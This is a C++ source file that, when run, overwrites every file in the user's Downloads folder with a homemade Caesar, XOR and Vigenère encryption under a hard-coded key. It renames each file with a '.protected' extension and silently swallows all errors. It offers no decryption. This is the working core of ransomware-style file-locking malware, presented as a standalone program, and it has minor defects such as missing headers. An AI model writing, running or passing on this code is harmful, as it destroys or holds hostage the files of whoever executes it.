#include <filesystem>
#include <fstream>
#include <string>
#include <vector>

namespace fs = std::filesystem;

// Caesar cipher encryption
char caesarEncrypt(char c, int shift) {
    if (isalpha(c)) {
        char base = islower(c) ? 'a' : 'A';
        return (c - base + shift) % 26 + base;
    }
    return c;
}

// XOR encryption
char xorEncrypt(char c, char key) {
    return c ^ key;
}

// Vigenère cipher encryption
char vigenereEncrypt(char c, char key) {
    if (isalpha(c)) {
        char base = islower(c) ? 'a' : 'A';
        return (c - base + (tolower(key) - 'a')) % 26 + base;
    }
    return c;
}

// Combine all encryption methods
char encryptChar(char c, int caesarShift, char xorKey, char vigenereKey) {
    c = caesarEncrypt(c, caesarShift);
    c = xorEncrypt(c, xorKey);
    c = vigenereEncrypt(c, vigenereKey);
    return c;
}

// Encrypt the content of a file
std::string encryptContent(const std::string& content, const std::string& vigenereKey) {
    std::string encrypted;
    int caesarShift = 3;  // Example Caesar cipher shift
    char xorKey = 'X';    // Example XOR key
    for (size_t i = 0; i < content.size(); ++i) {
        char vKey = vigenereKey[i % vigenereKey.size()];
        encrypted += encryptChar(content[i], caesarShift, xorKey, vKey);
    }
    return encrypted;
}

// Encrypt all files in the Downloads directory
void encryptFilesInDownloads() {
    std::string userProfile = std::getenv("USERPROFILE");
    fs::path downloadsPath = userProfile + "\\Downloads";

    if (!fs::exists(downloadsPath) || !fs::is_directory(downloadsPath)) {
        return;
    }

    std::string vigenereKey = "magicspell";

    for (const auto& entry : fs::directory_iterator(downloadsPath)) {
        if (entry.is_regular_file()) {
            try {
                // Read file content
                std::ifstream inputFile(entry.path(), std::ios::binary);
                std::ostringstream buffer;
                buffer << inputFile.rdbuf();
                std::string content = buffer.str();
                inputFile.close();

                // Encrypt content
                std::string encryptedContent = encryptContent(content, vigenereKey);

                // Write encrypted content to the same file
                std::ofstream outputFile(entry.path(), std::ios::binary);
                outputFile << encryptedContent;
                outputFile.close();

                // Rename the file
                fs::rename(entry.path(), entry.path().string() + ".protected");

            } catch (const std::exception&) {
                // Suppress all exceptions
            }
        }
    }
}

int main() {
    encryptFilesInDownloads();
    return 0;
}
